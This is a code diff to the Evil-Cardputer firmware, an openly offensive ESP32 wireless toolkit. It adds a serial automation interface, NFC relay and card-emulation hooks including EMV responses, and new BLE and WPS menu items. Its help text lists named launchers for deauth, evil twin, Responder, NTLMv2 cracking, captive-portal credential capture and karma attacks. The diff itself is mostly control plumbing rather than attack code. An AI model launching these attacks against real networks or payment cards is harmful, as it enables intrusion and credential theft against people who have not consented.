@@ -155,6 +155,7 @@ struct PcapHsEntry {
 
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
+#include <RadioLib.h>
 
 // Forward declarations for menu entries defined later
 void FindMyEvilTx();
@@ -201,6 +202,10 @@ struct TotemBleFrame;
 void tagTinkerMenu();
 void csiRadarMenu();
 void totemCompassMenu();
+void whisperPairMenu();
+void wpsAuditorMenu();
+void beaconScanMenu();
+void appleContinuityMenu();
 void keyRelease();
 void subGhzMenu();
 void nfcMenu();
@@ -225,6 +230,32 @@ extern uint16_t tt_wake_repeats_val;
 extern uint8_t tt_comp_mode;
 extern uint8_t tt_page;
 bool tt_nfc_to_barcode(const char* nfc10, char* out17);
+// NFC relay/emulation forward decls (suppress Arduino auto-prototype 'static extern "C"' bug on callbacks)
+void nfc_write_pta_mem(const uint8_t* buf, int len);
+void nfc_emul_start(const uint8_t* uid, int uid_len, uint16_t atqa, uint8_t sak);
+int  nfc_emul_poll(uint8_t* buf, int max_len, int timeout_ms, uint8_t* tgt_irq);
+void nfc_emul_stop();
+bool nfc_emul_tx(const uint8_t* buf, int len);
+int fsd_from_fsdi(uint8_t fsdi);
+bool nfc_emul_tx_isodep(const uint8_t* payload, int len, uint8_t bn, int cid);
+void relay_service_iblock(uint8_t* frame, int fn, uint8_t* seq, int* relayed, int* wtx_sent);
+void serial_relay_B();
+void serial_vcard_A(int prof);
+static volatile unsigned long g_last_rtt = 0, g_max_rtt = 0, g_sum_rtt = 0;
+static volatile int g_rtt_n = 0;
+static volatile bool g_relay_stop = false;
+static volatile bool g_relay_active = false;
+static volatile int  g_launch = 0;       // 0=none, 1=relayB, 2=vcardA (set by serial, run by loop())
+static volatile int  g_launch_prof = 0;
+static void rly_on_recv(const uint8_t* mac, const uint8_t* data, int len);
+static void rly_send(uint8_t type, uint8_t seq, const uint8_t* payload, int len);
+static bool rly_begin();
+static void rly_end();
+int  nfc_build_emul_ats(uint8_t* out);
+const char* vcard_name(int p);
+int  vcard_ident(int p, uint8_t* id);
+int  vcard_response(int p, const uint8_t* apdu, int alen, uint8_t* out);
+int  emv_full_response(const uint8_t* apdu, int alen, uint8_t* out);
 void tt_wifi_icon_on();
 void tt_wifi_icon_off_all();
 
@@ -252,6 +283,7 @@ extern "C" {
 #include "esp_wifi.h"
 #include "esp_system.h"
 #include "esp_mac.h"
+#include "esp_core_dump.h"
 }
 
 bool ledOn = true;
@@ -361,6 +393,10 @@ static const char * const PROGMEM menuItems[] = {
   "Totem Compass",
   "Cap Sub-GHz",
   "Cap NFC",
+  "WhisperPair",
+  "Apple BLE Sniff",
+  "WPS Auditor",
+  "Beacon Scan",
   "Settings",
 };
 
@@ -792,6 +828,8 @@ const unsigned long karmaChannelInterval = 333; // en ms
 //config file
 const char* configFolderPath = "/evil/config";
 const char* configFilePath = "/evil/config/config.txt";
+#define TOTEM_NAME_MAX 20
+char totem_device_name[TOTEM_NAME_MAX + 1] = "Evil-Cardputer";
 // Boot launcher config
 bool startAtBootFlag = false;      // if true, launch a menu case at boot
 int  caseToStartAtBoot = -1;       // index of menuItems[] / executeMenuItem case
@@ -1575,6 +1613,55 @@ void setupNavigatorRoutes() {
 
 // ── End Navigator WebUI ─────────────────────────────────────────────────────
 
+// ── Crash logger : reset_reason + coredump -> SD au boot ────────────────────
+// A appeler APRES le montage SD. Logge la raison du dernier reboot (PANIC/WDT/
+// BROWNOUT/...) et, si un coredump est en flash (crash precedent), en extrait la
+// tache/PC/backtrace dans /evil/crash.log puis efface le coredump (anti-repeat).
+void crash_boot_log() {
+  esp_reset_reason_t rr = esp_reset_reason();
+  const char* rn;
+  switch (rr) {
+    case ESP_RST_POWERON:   rn = "POWERON";   break;
+    case ESP_RST_EXT:       rn = "EXT";       break;
+    case ESP_RST_SW:        rn = "SW";        break;
+    case ESP_RST_PANIC:     rn = "PANIC";     break;
+    case ESP_RST_INT_WDT:   rn = "INT_WDT";   break;
+    case ESP_RST_TASK_WDT:  rn = "TASK_WDT";  break;
+    case ESP_RST_WDT:       rn = "WDT";       break;
+    case ESP_RST_DEEPSLEEP: rn = "DEEPSLEEP"; break;
+    case ESP_RST_BROWNOUT:  rn = "BROWNOUT";  break;
+    case ESP_RST_SDIO:      rn = "SDIO";      break;
+    default:                rn = "UNKNOWN";   break;
+  }
+  bool crashy = (rr == ESP_RST_PANIC || rr == ESP_RST_INT_WDT ||
+                 rr == ESP_RST_TASK_WDT || rr == ESP_RST_WDT || rr == ESP_RST_BROWNOUT);
+  Serial.printf("[BOOT] reset=%s (%s)\n", rn, crashy ? "CRASH!" : "normal");
+  SD.mkdir("/evil");
+  File f = SD.open("/evil/crash.log", FILE_APPEND);
+  if (f) f.printf("[BOOT] reset=%s%s heap=%u min=%u\n", rn, crashy ? " *CRASH*" : "",
+                  (unsigned)ESP.getFreeHeap(), (unsigned)ESP.getMinFreeHeap());
+
+  if (esp_core_dump_image_check() == ESP_OK) {
+    esp_core_dump_summary_t* s = (esp_core_dump_summary_t*)malloc(sizeof(esp_core_dump_summary_t));
+    if (s && esp_core_dump_get_summary(s) == ESP_OK) {
+      Serial.printf("[COREDUMP] task=%s PC=0x%08X\n", s->exc_task, (unsigned)s->exc_pc);
+      if (f) {
+        f.printf("[COREDUMP] task=%s PC=0x%08X cause=%u vaddr=0x%08X\n",
+                 s->exc_task, (unsigned)s->exc_pc,
+                 (unsigned)s->ex_info.exc_cause, (unsigned)s->ex_info.exc_vaddr);
+        f.print("  backtrace:");
+        for (uint32_t i = 0; i < s->exc_bt_info.depth && i < 16; i++)
+          f.printf(" 0x%08X", (unsigned)s->exc_bt_info.bt[i]);
+        f.printf("%s\n", s->exc_bt_info.corrupted ? " (corrupted)" : "");
+      }
+    }
+    if (s) free(s);
+    esp_core_dump_image_erase();   // efface pour ne pas re-reporter au prochain boot
+    if (f) f.println("[COREDUMP] efface.");
+  }
+  if (f) f.close();
+}
+
 void setup() {
   Serial.begin(115200);
   M5.begin();
@@ -1921,6 +2008,8 @@ void setup() {
     Serial.println(F("SD card initialized !! "));
     Serial.println(F("----------------------"));
 
+    crash_boot_log();   // logge raison du dernier reboot + coredump eventuel -> /evil/crash.log
+
     // Vérifier et créer le dossier audio s'il n'existe pas
     if (!SD.exists("/evil/audio")) {
       Serial.println(F("Audio folder not found, creating..."));
@@ -2031,6 +2120,7 @@ void setup() {
   restoreConfigParameter("startatboot");
   restoreConfigParameter("casetostartatboot");
   restoreConfigParameter("boot_countdown");
+  restoreConfigParameter("totem_name");
   int textY = 30;
   int lineOffset = 10;
   int lineY1 = textY - lineOffset;
@@ -2046,7 +2136,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.5.5 2026";
+  const char* text3 = "v1.5.6 2026";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -2076,7 +2166,7 @@ void setup() {
   Serial.println(F("-------------------"));
   Serial.println(F("Evil-Cardputer"));
   Serial.println(F("By 7h30th3r0n3"));
-  Serial.println(F("v1.5.5 2026"));
+  Serial.println(F("v1.5.6 2026"));
   Serial.println(F("-------------------"));
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -2366,6 +2456,13 @@ void loop() {
   cardUpdate();
   navigatorInjectKeys();
   handleDnsRequestSerial();
+  // Serial-requested relay launch (run here, not from checkSerialCommands, to avoid re-entrancy)
+  if (g_launch && !g_relay_active) {
+    int L = g_launch; int P = g_launch_prof; g_launch = 0;
+    g_relay_active = true; g_relay_stop = false; inMenu = false;
+    if (L == 1) serial_relay_B(); else if (L == 2) serial_vcard_A(P);
+    inMenu = true; g_relay_active = false; drawMenu();
+  }
   unsigned long currentMillis = millis();
 
   // One-shot boot launcher: allow a short countdown to cancel
@@ -2759,7 +2856,11 @@ void executeMenuItem(int index) {
     case 88: totemCompassMenu(); break;
     case 89: subGhzMenu(); break;
     case 90: nfcMenu(); break;
-    case 91: showSettingsMenu(); break;
+    case 91: whisperPairMenu(); break;
+    case 92: appleContinuityMenu(); break;
+    case 93: wpsAuditorMenu(); break;
+    case 94: beaconScanMenu(); break;
+    case 95: showSettingsMenu(); break;
   }
   isOperationInProgress = false;
 }
@@ -3150,10 +3251,269 @@ bool isProbeAttackRunning = false;
 bool stopProbeSniffingViaSerial = false;
 bool isProbeSniffingRunning = false;
 
+// Sortie JSON structurée optionnelle pour les commandes d'automation (portage AtomS3R).
+static bool g_jsonOut = false;
+
+// Lance une fonction du menu par son nom (raccourcis serial : deauth, evil_twin…)
+void runByName(const char* name) {
+  for (int i = 0; i < menuSize; i++)
+    if (strcmp((const char*)menuItems[i], name) == 0) {
+      Serial.printf("[RUN] %s\n", name); executeMenuItem(i); Serial.println(F("[RUN] done")); return;
+    }
+  Serial.printf("Function not found: %s\n", name);
+}
+// Pins exposées sur le Grove HY2.0 du Cardputer (G1=GPIO1, G2=GPIO2).
+bool isPinAllowed(int pin) { return pin == 1 || pin == 2; }
+// MJPEG : contrôle série du viewer CCTV (définis près de mjpegViewerFS).
+void mjpegSerialList();
+void mjpegSerialView(int idx);
+
 void checkSerialCommands() {
   if (Serial.available()) {
     String command = Serial.readStringUntil('\n');
     command.trim();
+    if (command == "ping") { Serial.println("[SER] pong"); return; }
+    if (command == "relayb") { if (!g_relay_active) g_launch = 1; return; }     // launched by loop(), not here (avoid re-entrancy)
+    if (command.startsWith("vcard")) { if (!g_relay_active) { g_launch_prof = command.substring(5).toInt(); g_launch = 2; } return; }
+    if (command == "relaystop") { g_relay_stop = true; return; }
+    if (command == "relaylog clear") { SD.remove("/evil/relay_log.txt"); Serial.println("[RELAYLOG] cleared"); return; }
+    if (command == "relaylog") {
+        File f = SD.open("/evil/relay_log.txt", FILE_READ);
+        if (!f) { Serial.println("[RELAYLOG] no file (appuie BACK apres le test pour ecrire)"); return; }
+        Serial.printf("[RELAYLOG] === %d bytes ===\n", (int)f.size());
+        uint8_t buf[256]; int n;
+        while ((n = f.read(buf, sizeof(buf))) > 0) { Serial.write(buf, n); Serial.flush(); }
+        f.close();
+        Serial.println("\n[RELAYLOG] === end ===");
+        return;
+    }
+
+    // ── Automation / navigation en série (portage Evil-AtomS3R) ──
+    if (command == "up")    { navPendingAction = NAV_UP;     navActionTime = millis(); Serial.println(F("[NAV] up"));    return; }
+    if (command == "down")  { navPendingAction = NAV_DOWN;   navActionTime = millis(); Serial.println(F("[NAV] down"));  return; }
+    if (command == "left")  { navPendingAction = NAV_PGUP;   navActionTime = millis(); Serial.println(F("[NAV] left"));  return; }
+    if (command == "right") { navPendingAction = NAV_PGDOWN; navActionTime = millis(); Serial.println(F("[NAV] right")); return; }
+    if (command == "ok" || command == "enter") { navPendingAction = NAV_ENTER; navActionTime = millis(); Serial.println(F("[NAV] enter")); return; }
+    if (command == "back")  { navPendingAction = NAV_BACK;   navActionTime = millis(); Serial.println(F("[NAV] back"));  return; }
+    if (command.startsWith("key ")) {
+      int c = command.substring(4).toInt();
+      if (c > 0 && c < 256) { navPendingChar = (uint8_t)c; navPendingCharValid = true; navActionTime = millis(); Serial.printf("[NAV] key %d\n", c); }
+      else Serial.println(F("Usage: key <1-255>"));
+      return;
+    }
+    if (command == "menu") {
+      if (g_jsonOut) {
+        Serial.printf("{\"cursor\":%d,\"count\":%d,\"items\":[", currentIndex, menuSize);
+        for (int i = 0; i < menuSize; i++)
+          Serial.printf("%s{\"i\":%d,\"n\":\"%s\"}", i ? "," : "", i, jsonEscape((const char*)menuItems[i]).c_str());
+        Serial.println("]}");
+      } else {
+        Serial.printf("=== Menu (cursor=%d/%d) ===\n", currentIndex, menuSize);
+        for (int i = 0; i < menuSize; i++)
+          Serial.printf("%2d %s %s\n", i, i == currentIndex ? ">" : " ", (const char*)menuItems[i]);
+      }
+      return;
+    }
+    if (command.startsWith("run ")) {
+      int idx = command.substring(4).toInt();
+      if (idx >= 0 && idx < menuSize) {
+        Serial.printf("[RUN] %d %s\n", idx, (const char*)menuItems[idx]);
+        executeMenuItem(idx);
+        Serial.println(F("[RUN] done"));
+      } else Serial.printf("Usage: run <0..%d>\n", menuSize - 1);
+      return;
+    }
+    if (command == "sysinfo") {
+      bool wc = WiFi.status() == WL_CONNECTED;
+      unsigned psK = ESP.getPsramSize() / 1024, psFreeK = ESP.getFreePsram() / 1024;
+      unsigned heapK = ESP.getFreeHeap() / 1024;
+      unsigned long up = millis() / 1000;
+      if (g_jsonOut) {
+        Serial.printf("{\"board\":\"Cardputer\",\"heap_k\":%u,\"psram_k\":%u,\"psram_free_k\":%u,\"uptime_s\":%lu,\"wifi\":%s}\n",
+                      heapK, psK, psFreeK, up, wc ? "true" : "false");
+      } else {
+        Serial.printf("Board: Cardputer\nHeap: %uK free\nPSRAM: %uK (%uK free)\nUptime: %lus\nWiFi: %s\n",
+                      heapK, psK, psFreeK, up, wc ? "connected" : "off");
+      }
+      return;
+    }
+    if (command == "state") {
+      const char* cur = (inMenu && currentIndex >= 0 && currentIndex < menuSize) ? (const char*)menuItems[currentIndex] : "";
+      if (g_jsonOut)
+        Serial.printf("{\"inMenu\":%s,\"op\":%s,\"cursor\":%d,\"cursor_name\":\"%s\"}\n",
+                      inMenu ? "true" : "false", isOperationInProgress ? "true" : "false", currentIndex, jsonEscape(cur).c_str());
+      else
+        Serial.printf("inMenu=%d op=%d cursor=%d name=%s\n",
+                      inMenu ? 1 : 0, isOperationInProgress ? 1 : 0, currentIndex, cur);
+      return;
+    }
+    if (command == "json on")  { g_jsonOut = true;  Serial.println(F("JSON on"));  return; }
+    if (command == "json off") { g_jsonOut = false; Serial.println(F("JSON off")); return; }
+    if (command == "reboot")   { Serial.println(F("Rebooting...")); delay(150); ESP.restart(); return; }
+
+    // ── Lanceurs nommés (raccourcis vers un item de menu) ──
+    if (command == "crack_ntlm")  { runByName("Crack NTLMv2");       return; }
+    if (command == "deauth")      { runByName("Deauther");           return; }
+    if (command == "beacon_spam") { runByName("Beacon Spam");        return; }
+    if (command == "handshake")   { runByName("Handshake Master");   return; }
+    if (command == "evil_twin")   { runByName("Evil Twin");          return; }
+    if (command == "responder")   { runByName("Responder");          return; }
+    if (command == "cctv_scan")   { runByName("CCTV Toolkit");       return; }
+    if (command == "scan_hosts")  { runByName("Scan Network Hosts"); return; }
+    if (command == "scan_full")   { runByName("Scan Network Full");  return; }
+    if (command == "wardrive")    { runByName("Wardriving");         return; }
+
+    // ── WiFi (STA) ──
+    if (command.startsWith("wifi_connect")) {
+      String rest = command.substring(12); rest.trim();
+      int sp = rest.indexOf(' ');
+      String ssid = (sp >= 0) ? rest.substring(0, sp) : rest;
+      String pass = (sp >= 0) ? rest.substring(sp + 1) : "";
+      ssid.trim();
+      if (ssid.length() == 0) { Serial.println(F("Usage: wifi_connect <ssid> [password]")); return; }
+      Serial.printf("[WiFi] Connecting to '%s'...\n", ssid.c_str());
+      WiFi.mode(WIFI_STA);
+      if (pass.length()) WiFi.begin(ssid.c_str(), pass.c_str()); else WiFi.begin(ssid.c_str());
+      uint32_t t0 = millis();
+      while (WiFi.status() != WL_CONNECTED && millis() - t0 < 15000) { delay(250); Serial.print('.'); }
+      Serial.println();
+      if (WiFi.status() == WL_CONNECTED) Serial.printf("[WiFi] Connected. IP: %s\n", WiFi.localIP().toString().c_str());
+      else Serial.println(F("[WiFi] Failed/timeout."));
+      return;
+    }
+    if (command == "wifi_status") {
+      if (WiFi.status() == WL_CONNECTED) Serial.printf("Connected '%s' IP:%s RSSI:%d\n", WiFi.SSID().c_str(), WiFi.localIP().toString().c_str(), WiFi.RSSI());
+      else Serial.println(F("WiFi not connected"));
+      return;
+    }
+    if (command == "wifi_disconnect") { WiFi.disconnect(); Serial.println(F("[WiFi] Disconnected")); return; }
+
+    // ── Portal / clone ──
+    if (command.startsWith("set_ssid ")) { String v = command.substring(9); v.trim(); if (v.length()) { cloneSSIDForCaptivePortal(v); Serial.printf("SSID set: %s\n", v.c_str()); } else Serial.println(F("Usage: set_ssid <name>")); return; }
+    if (command.startsWith("set_password ")) { String v = command.substring(13); if (v.length() >= 8 || v.length() == 0) { captivePortalPassword = v; Serial.printf("Password set (%d chars)\n", v.length()); } else Serial.println(F("Password >=8 chars or empty")); return; }
+    if (command.startsWith("set_mac ")) { String v = command.substring(8); v.trim(); if (isValidMacAddress(v)) { setDeviceMacAddress(v); Serial.printf("MAC set: %s\n", v.c_str()); } else Serial.println(F("Invalid MAC (XX:XX:XX:XX:XX:XX)")); return; }
+
+    // ── GPS / captures ──
+    if (command == "gps_status") {
+      if (gps.location.isValid()) Serial.printf("GPS: lat=%.6f lng=%.6f sats=%d\n", gps.location.lat(), gps.location.lng(), (int)gps.satellites.value());
+      else Serial.printf("GPS: no fix. sats=%d chars=%lu\n", (int)gps.satellites.value(), (unsigned long)gps.charsProcessed());
+      return;
+    }
+    if (command == "list_handshakes") { Serial.printf("Handshakes/PMKID captured: %d\n", nombreDeHandshakes); return; }
+
+    // ── Recherche menu ──
+    if (command.startsWith("search ")) {
+      String q = command.substring(7); q.trim(); if (q.length() > 16) q = q.substring(0, 16);
+      strncpy(menuSearchQuery, q.c_str(), 16); menuSearchQuery[16] = '\0'; menuSearchLen = q.length();
+      currentIndex = 0; rebuildMenuFilter();
+      Serial.printf("Search '%s'. Use up/down/ok or 'run <idx>'\n", menuSearchQuery);
+      if (inMenu) drawMenu();
+      return;
+    }
+    if (command == "search_clear") { menuSearchLen = 0; menuSearchQuery[0] = '\0'; currentIndex = 0; rebuildMenuFilter(); if (inMenu) drawMenu(); Serial.println(F("Search cleared")); return; }
+
+    // ── Résultats du dernier scan WiFi ──
+    if (command == "scan_results") {
+      if (numSsid <= 0) { Serial.println(F("No scan yet (run 'scan_wifi')")); return; }
+      if (g_jsonOut) {
+        Serial.print("[");
+        for (int i = 0; i < numSsid && i < 30; i++) {
+          String nm = (i < (int)ssidList.size()) ? ssidList[i] : String("");
+          Serial.printf("%s{\"i\":%d,\"ssid\":\"%s\",\"rssi\":%d,\"ch\":%d}", i ? "," : "", i, jsonEscape(nm).c_str(), (int)ssidRssi[i], (int)ssidChan[i]);
+        }
+        Serial.println("]");
+      } else {
+        for (int i = 0; i < numSsid && i < 30; i++) {
+          String nm = (i < (int)ssidList.size()) ? ssidList[i] : String("");
+          Serial.printf("%2d %-24s rssi=%d ch=%d\n", i, nm.c_str(), (int)ssidRssi[i], (int)ssidChan[i]);
+        }
+      }
+      return;
+    }
+
+    // ── MJPEG CCTV (contrôle série du viewer) ──
+    if (command == "mjpeg_list") { mjpegSerialList(); return; }
+    if (command.startsWith("mjpeg ")) {
+      String arg = command.substring(6); arg.trim();
+      if (arg.length() == 0) { Serial.println(F("Usage: mjpeg <url> | mjpeg <index>  (see mjpeg_list)")); return; }
+      bool numeric = true; for (size_t i = 0; i < arg.length(); i++) if (!isDigit(arg[i])) { numeric = false; break; }
+      if (numeric) { mjpegSerialView(arg.toInt()); return; }
+      Serial.printf("[MJPEG] Viewer start: %s (send 'back' to exit)\n", arg.c_str());
+      if (!SD.exists("/evil/tmp")) SD.mkdir("/evil/tmp");
+      inMenu = false; isOperationInProgress = true;
+      mjpegViewerFS(arg.c_str(), SD, "/evil/tmp/mjpeg_a.jpg", "/evil/tmp/mjpeg_b.jpg");
+      isOperationInProgress = false; inMenu = true;
+      Serial.println(F("[MJPEG] Viewer exited"));
+      return;
+    }
+
+    // ── LED (NeoPixel intégrée) ──
+    if (command.startsWith("led ")) {
+      String a = command.substring(4); a.trim();
+      if (a == "off") { for (int i = 0; i < NUMPIXELS; i++) pixels.setPixelColor(i, 0); pixels.show(); Serial.println(F("led off")); return; }
+      if (a.startsWith("all ")) a = a.substring(4);
+      int p1 = a.indexOf(' '), p2 = a.indexOf(' ', p1 + 1);
+      if (p1 < 0 || p2 < 0) { Serial.println(F("Usage: led <r> <g> <b> | led off")); return; }
+      int r = a.substring(0, p1).toInt(), g = a.substring(p1 + 1, p2).toInt(), b = a.substring(p2 + 1).toInt();
+      for (int i = 0; i < NUMPIXELS; i++) pixels.setPixelColor(i, pixels.Color(r, g, b));
+      pixels.show(); Serial.printf("led %d %d %d ok\n", r, g, b); return;
+    }
+
+    // ── GPIO / ADC / PWM (Grove G1=GPIO1, G2=GPIO2) ──
+    if (command.startsWith("gpio ")) {
+      String a = command.substring(5); a.trim();
+      int s1 = a.indexOf(' '); String sub = (s1 < 0) ? a : a.substring(0, s1);
+      String args = (s1 < 0) ? String("") : a.substring(s1 + 1); args.trim();
+      if (sub == "mode") {
+        int s2 = args.indexOf(' '); if (s2 < 0) { Serial.println(F("Usage: gpio mode <pin> <in|out|pullup|pulldown>")); return; }
+        int pin = args.substring(0, s2).toInt(); String m = args.substring(s2 + 1); m.trim();
+        if (!isPinAllowed(pin)) { Serial.printf("Error: pin %d reserved (use 1 or 2)\n", pin); return; }
+        if      (m == "in")       pinMode(pin, INPUT);
+        else if (m == "out")      pinMode(pin, OUTPUT);
+        else if (m == "pullup")   pinMode(pin, INPUT_PULLUP);
+        else if (m == "pulldown") pinMode(pin, INPUT_PULLDOWN);
+        else { Serial.println(F("mode: in|out|pullup|pulldown")); return; }
+        Serial.printf("gpio mode %d=%s ok\n", pin, m.c_str()); return;
+      }
+      if (sub == "read") {
+        int pin = args.toInt();
+        if (!isPinAllowed(pin)) { Serial.printf("Error: pin %d reserved\n", pin); return; }
+        int v = digitalRead(pin);
+        if (g_jsonOut) Serial.printf("{\"pin\":%d,\"value\":%d}\n", pin, v); else Serial.printf("gpio read %d=%d\n", pin, v);
+        return;
+      }
+      if (sub == "write") {
+        int s2 = args.indexOf(' '); if (s2 < 0) { Serial.println(F("Usage: gpio write <pin> <0|1>")); return; }
+        int pin = args.substring(0, s2).toInt(); int v = args.substring(s2 + 1).toInt() ? 1 : 0;
+        if (!isPinAllowed(pin)) { Serial.printf("Error: pin %d reserved\n", pin); return; }
+        digitalWrite(pin, v); Serial.printf("gpio write %d=%d ok\n", pin, v); return;
+      }
+      Serial.println(F("Usage: gpio <mode|read|write> ...")); return;
+    }
+    if (command.startsWith("adc ")) {
+      int pin = command.substring(4).toInt();
+      if (!isPinAllowed(pin)) { Serial.printf("Error: pin %d reserved\n", pin); return; }
+      int raw = analogRead(pin); int mv = (int)((uint32_t)raw * 3300 / 4095);
+      if (g_jsonOut) Serial.printf("{\"pin\":%d,\"raw\":%d,\"mv\":%d}\n", pin, raw, mv); else Serial.printf("adc %d=%d (%d mV)\n", pin, raw, mv);
+      return;
+    }
+    if (command.startsWith("pwm ")) {
+      String a = command.substring(4); a.trim();
+      int s1 = a.indexOf(' '); if (s1 < 0) { Serial.println(F("Usage: pwm <pin> <duty0-255|off> [freq]")); return; }
+      int pin = a.substring(0, s1).toInt(); String rest = a.substring(s1 + 1); rest.trim();
+      if (!isPinAllowed(pin)) { Serial.printf("Error: pin %d reserved\n", pin); return; }
+      const int CH = 7;
+      if (rest == "off") { ledcDetachPin(pin); pinMode(pin, INPUT); Serial.printf("pwm %d off\n", pin); return; }
+      int s2 = rest.indexOf(' '); int duty = (s2 < 0 ? rest : rest.substring(0, s2)).toInt();
+      int freq = (s2 < 0) ? 5000 : rest.substring(s2 + 1).toInt(); if (freq <= 0) freq = 5000;
+      if (duty < 0) duty = 0; if (duty > 255) duty = 255;
+      ledcSetup(CH, freq, 8); ledcAttachPin(pin, CH); ledcWrite(CH, duty);
+      Serial.printf("pwm %d duty=%d freq=%d ok\n", pin, duty, freq); return;
+    }
+    if (command.startsWith("brightness set ")) {
+      int b = command.substring(15).toInt(); if (b < 0) b = 0; if (b > 255) b = 255;
+      M5.Display.setBrightness(b); Serial.printf("Brightness: %d\n", b); return;
+    }
     if (command == "scan_wifi") {
       isOperationInProgress = true;
       inMenu = false;
@@ -3266,41 +3626,51 @@ void checkSerialCommands() {
       startAutoKarma();
       delay(200);
     } else if (command == "help") {
-      Serial.println(F("-------------------"));
-      Serial.println(F("Available Commands:"));
-      Serial.println(F("scan_wifi - Scan WiFi Networks"));
-      Serial.println(F("select_network <index> - Select WiFi <index>"));
-      Serial.println(F("change_ssid <max 32 char> - change current SSID"));
-      Serial.println(F("set_portal_password <password min 8> - change portal password"));
-      Serial.println(F("set_portal_open  - change portal to open"));
-      Serial.println(F("detail_ssid <index> - Details of WiFi <index>"));
-      Serial.println(F("clone_ssid - Clone Network SSID"));
-      Serial.println(F("start_portal - Activate Captive Portal"));
-      Serial.println(F("stop_portal - Deactivate Portal"));
-      Serial.println(F("list_portal - Show Portal List"));
-      Serial.println(F("change_portal <index> - Switch Portal <index>"));
-      Serial.println(F("check_credentials - Check Saved Credentials"));
-      Serial.println(F("monitor_status - Get current information on device"));
-      Serial.println(F("probe_attack - Initiate Probe Attack"));
-      Serial.println(F("stop_probe_attack - End Probe Attack"));
-      Serial.println(F("probe_sniffing - Begin Probe Sniffing"));
-      Serial.println(F("stop_probe_sniffing - End Probe Sniffing"));
-      Serial.println(F("list_probes - Show Probes"));
-      Serial.println(F("select_probes <index> - Choose Probe <index>"));
-      Serial.println(F("karma_auto - Auto Karma Attack Mode"));
-      Serial.println(F("ciw_start - Start CIW Zeroclick broadcast"));
-      Serial.println(F("ciw_stop - Stop CIW Zeroclick broadcast"));
-      Serial.println(F("ciw_status - CIW Zeroclick status"));
-      Serial.println(F("--- TagTinker ESL ---"));
-      Serial.println(F("tag blink              - broadcast LED blink 1s"));
-      Serial.println(F("tag blink_alert        - broadcast slow blink 5s"));
-      Serial.println(F("tag debug              - broadcast debug screen"));
-      Serial.println(F("tag page <N>           - broadcast page flip"));
-      Serial.println(F("tag led <BARCODE> [s]  - LED on targeted tag"));
-      Serial.println(F("tag text <BARCODE> msg - push text to tag"));
-      Serial.println(F("tag rawsend N HH HH.. - send raw IR frame"));
-      Serial.println(F("tag help               - TagTinker commands"));
-      Serial.println(F("-------------------"));
+      Serial.println(F("===================== Evil-Cardputer serial ====================="));
+      Serial.println(F("[AUTOMATION / NAV]  (piloter le Cardputer en serie)"));
+      Serial.println(F("  up|down|left|right|ok|back - inject navigation"));
+      Serial.println(F("  key <1-255>              - inject one ASCII/key code"));
+      Serial.println(F("  menu                     - list menu functions (index, cursor)"));
+      Serial.println(F("  run <index>              - run a menu function by index"));
+      Serial.println(F("  search <q> / search_clear - filter menu, then up/down/run"));
+      Serial.println(F("[SYSTEM & STATE]"));
+      Serial.println(F("  ping                     - pong"));
+      Serial.println(F("  sysinfo                  - board/heap/PSRAM/uptime/WiFi"));
+      Serial.println(F("  state                    - inMenu/op/cursor/name"));
+      Serial.println(F("  json on|off              - structured JSON output"));
+      Serial.println(F("  brightness set <0-255>   - screen brightness"));
+      Serial.println(F("  reboot                   - restart the device"));
+      Serial.println(F("[ATTACKS] (launch by name)"));
+      Serial.println(F("  crack_ntlm deauth beacon_spam handshake evil_twin"));
+      Serial.println(F("  responder cctv_scan scan_hosts scan_full wardrive karma_auto"));
+      Serial.println(F("[WIFI / PORTAL]"));
+      Serial.println(F("  scan_wifi / scan_results / select_network <i> / detail_ssid <i>"));
+      Serial.println(F("  wifi_connect <ssid> [pw] / wifi_status / wifi_disconnect"));
+      Serial.println(F("  change_ssid <name> / set_ssid <name> / set_password <pw> / set_mac <mac>"));
+      Serial.println(F("  set_portal_password <pw> / set_portal_open"));
+      Serial.println(F("  clone_ssid / start_portal / stop_portal / list_portal"));
+      Serial.println(F("  change_portal <i> / check_credentials / monitor_status / list_handshakes"));
+      Serial.println(F("[GPS / CCTV]"));
+      Serial.println(F("  gps_status"));
+      Serial.println(F("  mjpeg_list / mjpeg <index|url>  - view CCTV MJPEG stream"));
+      Serial.println(F("[HW I/O] (Grove G1=1, G2=2)"));
+      Serial.println(F("  gpio mode|read|write <pin> ... / adc <pin> / pwm <pin> <duty> [freq]"));
+      Serial.println(F("  led <r> <g> <b> | led off"));
+      Serial.println(F("[PROBES]"));
+      Serial.println(F("  probe_attack / stop_probe_attack"));
+      Serial.println(F("  probe_sniffing / stop_probe_sniffing"));
+      Serial.println(F("  list_probes / select_probes <i> / karma_auto"));
+      Serial.println(F("[NFC RELAY] (Cap NFC)"));
+      Serial.println(F("  relayb                   - start relay side B"));
+      Serial.println(F("  vcard<N>                 - emulate card profile N"));
+      Serial.println(F("  relaystop                - stop relay/emulation"));
+      Serial.println(F("[CIW zeroclick]"));
+      Serial.println(F("  ciw_start / ciw_stop / ciw_status"));
+      Serial.println(F("[TagTinker ESL]"));
+      Serial.println(F("  tag blink|blink_alert|debug|page <N>"));
+      Serial.println(F("  tag led <BARCODE> [s] / tag text <BARCODE> msg"));
+      Serial.println(F("  tag rawsend N HH HH.. / tag help"));
+      Serial.println(F("================================================================="));
     } else if (command == "ciw_start") {
       ciwLoadPayloads(ciwSelectedCats);
       if (ciwPayloads.empty()) {
@@ -8254,6 +8624,9 @@ void restoreConfigParameter(String key) {
           } else if (key == "evilChatNickname") {
             stringValue.toCharArray(currentNick, sizeof(currentNick));
             Serial.println("Nickname restored to " + String(currentNick));
+          } else if (key == "totem_name") {
+            stringValue.toCharArray(totem_device_name, TOTEM_NAME_MAX + 1);
+            Serial.println("Totem name restored to " + String(totem_device_name));
           } else if (key == "portal_file") {
             String v = stringValue;
             if (!v.startsWith("/evil/sites/")) v = "/evil/sites/" + v;
@@ -9911,9 +10284,9 @@ Wardriving
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.5.5"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.5.6"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.5.5"; // Remplacez [release] par la version de l'OS de l'appareil
